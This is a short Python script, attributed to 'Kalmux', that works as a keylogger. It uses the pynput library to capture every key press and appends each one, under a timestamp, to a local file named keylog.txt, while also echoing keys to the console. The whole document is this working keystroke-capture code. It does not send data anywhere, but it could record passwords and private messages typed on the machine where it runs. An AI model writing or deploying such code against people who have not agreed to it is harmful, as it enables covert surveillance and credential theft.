
# By Kalmux

from pynput import keyboard
from datetime import datetime

current_time = datetime.now()
log_time = current_time.strftime("%Y-%m-%d %H:%M:%S")

with open("keylog.txt",'a') as log:
        try:
            log.write(f"\n\n {log_time} \n")
        except Exception as e :
            print(f"An Error Occured : {e}")

def keylog(key):
    key = str(key)
    print(key)
    with open("keylog.txt",'a') as log:
        try:
            log.write(f"{key}")
        except Exception as e :
            print(f"An Error Occured : {e}")

def listner():
    key_listner = keyboard.Listener(on_press=keylog)
    key_listner.start()
    print("starting")
    input()

listner()